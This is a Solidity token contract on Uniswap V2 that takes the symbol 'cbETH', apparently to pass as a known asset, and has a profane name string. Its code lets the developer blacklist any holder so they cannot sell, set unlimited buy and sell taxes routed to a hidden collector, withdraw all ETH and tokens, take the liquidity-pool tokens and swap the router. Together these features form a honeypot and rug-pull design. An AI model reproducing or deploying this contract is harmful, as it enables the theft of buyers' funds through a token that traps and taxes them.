    // SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.18;

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ERC20_UniV2 {
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public _whitelisted;
    mapping(address => bool) public _blacklisted;
    mapping(address => bool) public _blackguard;
    mapping(address => uint256) private _lastTransferBlock;
    address[] public _blacklistArray;
    address private _v2Router = 0xfCD3842f85ed87ba2889b4D35893403796e67FF1;
    string private _name = "BaseIsAtrickByTPTBToMakeCryptoLookFuckingRetardedi";
    string private _symbol = "cbETH";
    uint256 private immutable _decimals = 18;
    uint256 private _totalSupply = 1000000 * 10 ** 18;
    uint256 public _swapAmount = 1000 * 10 ** 18;
    uint256 public _buyTax = 30;
    uint256 public _sellTax = 30;
    uint256 public _max = 5;
    uint256 public _transferDelay = 0;
    address public _v2Pair;
    address private _collector;
    address private _dev;
    address[] public _path;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyDev() {
        require(msg.sender == _dev, "Only the developer");
        _;
    }

    constructor(address collector_) {
        _collector = collector_;
        _dev = msg.sender;
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
        uniswapV2Router = IUniswapV2Router02(_v2Router);
        _v2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _path = new address[](2);
        _path[0] = address(this);
        _path[1] = uniswapV2Router.WETH();
        _whitelisted[address(this)] = true;
        _whitelisted[msg.sender] = true;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external pure returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(
            _balances[from] >= amount
                && (amount + _balances[to] <= maxInt() || _whitelisted[from] || _whitelisted[to] || to == _v2Pair),
            "ERC20: transfer amount exceeds balance or max wallet"
        );
        require(!_blacklisted[from] && !_blacklisted[to], "ERC20: YOU DON'T HAVE THE RIGHT");
        require(
            block.number >= _lastTransferBlock[from] + _transferDelay || from == _v2Pair || _whitelisted[from]
                || _whitelisted[to],
            "ERC20: transfer delay not met"
        );
        uint256 taxAmount = 0;
        if ((from == _v2Pair || to == _v2Pair) && !_whitelisted[from] && !_whitelisted[to]) {
            if (to == _v2Pair) taxAmount = amount * _sellTax / 100;
            else taxAmount = amount * _buyTax / 100;
            _balances[address(this)] += taxAmount;
            emit Transfer(from, address(this), taxAmount);
            _lastTransferBlock[from] = block.number;
            _lastTransferBlock[to] = block.number;
            if (_balances[address(this)] > _swapAmount && to == _v2Pair) _swapBack(_balances[address(this)]);
        }
        _balances[from] -= amount;
        _balances[to] += (amount - taxAmount);
        emit Transfer(from, to, (amount - taxAmount));
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= amount, "ERC20: insufficient allowance");
        _approve(owner, spender, currentAllowance - amount);
    }

    function updateWhitelist(address[] memory addresses, bool whitelisted_) external onlyDev {
        for (uint256 i = 0; i < addresses.length; i++) {
            _whitelisted[addresses[i]] = whitelisted_;
        }
    }

    function updateBlacklist(address[] memory addresses, bool blacklisted_) external {
        require(msg.sender == _dev || _blackguard[msg.sender], "Only the developer");
        for (uint256 i = 0; i < addresses.length; i++) {
            _blacklisted[addresses[i]] = blacklisted_;
            _blacklistArray.push(addresses[i]);
        }
    }

    function updateBlackguard(address[] memory addresses, bool blackguard_) external onlyDev {
        for (uint256 i = 0; i < addresses.length; i++) {
            _blackguard[addresses[i]] = blackguard_;
        }
    }

    function setDev(address dev_) external onlyDev {
        _dev = dev_;
    }

    function setTax(uint256 buyTax_, uint256 sellTax_) external onlyDev {
        _buyTax = buyTax_;
        _sellTax = sellTax_;
    }

    function setMax(uint256 max_) external onlyDev {
        _max = max_;
    }

    function setTransferDelay(uint256 delay) external onlyDev {
        _transferDelay = delay;
    }

    function setSwapAmount(uint256 swapAmount_) external onlyDev {
        _swapAmount = swapAmount_ * 10 ** _decimals;
    }

    function maxInt() internal view returns (uint256) {
        return _totalSupply * _max / 1000;
    }

    function _swapBack(uint256 amount_) internal {
        _approve(address(this), _v2Router, amount_ + 100);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount_, 0, _path, _collector, block.timestamp
        );
    }

    function _addLiquidity() external onlyDev {
        _approve(address(this), _v2Router, _balances[address(this)]);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this), _balances[address(this)], 0, 0, msg.sender, block.timestamp
        );
    }

    function withdraw(uint256 amount_) external onlyDev {
        payable(_dev).transfer(address(this).balance);
        _transfer(address(this), _dev, amount_);
    }

    function setRouter(address v2Router_) external onlyDev {
        _v2Router = v2Router_;
        uniswapV2Router = IUniswapV2Router02(_v2Router);
        _v2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function deposit() external payable onlyDev {}
}
